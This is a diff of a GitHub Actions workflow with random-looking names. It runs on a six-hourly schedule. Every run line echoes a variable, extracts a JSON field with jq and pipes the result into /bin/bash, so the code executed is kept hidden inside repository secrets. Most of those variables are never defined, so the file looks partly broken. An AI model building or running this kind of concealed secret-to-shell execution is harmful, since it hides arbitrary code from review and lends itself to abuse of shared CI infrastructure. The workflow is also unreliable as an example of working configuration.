@@ -1,22 +1,30 @@
 name: wangwuxxi
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 5/6 * * *'
-jobs:  # 6544
+    - cron: '12 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: wangwuxxi
         env:
-          ev0214: ${{ secrets.ev0214 }}
+          oc069: ${{ secrets.oc069 }}
         run: |
-          echo $ev0214 | jq -r .ezq80 | /bin/bash
-          echo $qy65034 | jq -r .xub30850 | /bin/bash
-          echo $fknfh097 | jq -r .vehx5 | /bin/bash
-          echo $sfceh94658 | jq -r .qizz01670 | /bin/bash
-          echo $izlsm5768 | jq -r .bgvy1808 | /bin/bash
-          echo $nakmw725 | jq -r .f6 | /bin/bash
-          echo $bqbt610 | jq -r .xxhw560 | /bin/bash
+          echo $oc069 | jq -r .c1 | /bin/bash
+          echo $og788 | jq -r .yn92867 | /bin/bash
+          echo $phc9279 | jq -r .cy80 | /bin/bash
+          echo $xxnxw8730 | jq -r .dn89106 | /bin/bash
+          echo $znat4591 | jq -r .ltpa43 | /bin/bash
+          echo $ywwl635 | jq -r .yuxhq6 | /bin/bash
+          echo $j019 | jq -r .w36 | /bin/bash
+          echo $xajxg076 | jq -r .nk1 | /bin/bash
+          echo $bluq73954 | jq -r .gnpo61589 | /bin/bash
+          echo $rn60 | jq -r .y7 | /bin/bash
+          echo $ir236 | jq -r .delh0 | /bin/bash
+          echo $y54977 | jq -r .kn11377 | /bin/bash
+          echo $z8737 | jq -r .db97 | /bin/bash
 
